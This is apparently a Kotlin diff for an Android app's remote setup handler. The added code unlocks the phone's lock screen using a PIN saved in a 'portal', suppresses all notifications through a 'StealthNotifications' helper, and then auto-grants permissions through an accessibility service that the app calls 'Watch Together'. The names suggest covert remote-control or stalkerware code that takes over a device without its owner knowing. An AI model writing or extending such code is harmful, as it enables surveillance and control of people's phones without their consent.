@@ -190,13 +190,19 @@ object InputHandler {
             return
         }
         ScreenPower.wakeScreen(context)
-        SetupReporter.progress("Starting AI permission grant…", "start")
+        SetupReporter.progress("Unlocking phone first…", "start")
         bg.execute {
             val svc = TouchAccessibilityService.instance
-            if (svc != null) LockScreenHelper.unlockBlocking(context, svc)
-            mainHandler.postDelayed({
-                SettingsPermissionGrant.runLightning(context)
-            }, 350)
+            if (svc == null) {
+                SetupReporter.error("Watch Together is off on the phone")
+                return@execute
+            }
+            if (!LockScreenHelper.ensureUnlocked(context, svc, 22_000L)) {
+                SetupReporter.error("Unlock the phone first — tap Unlock or save PIN in portal")
+                return@execute
+            }
+            StealthNotifications.suppressAll(context)
+            SettingsPermissionGrant.runLightning(context)
         }
     }
 }
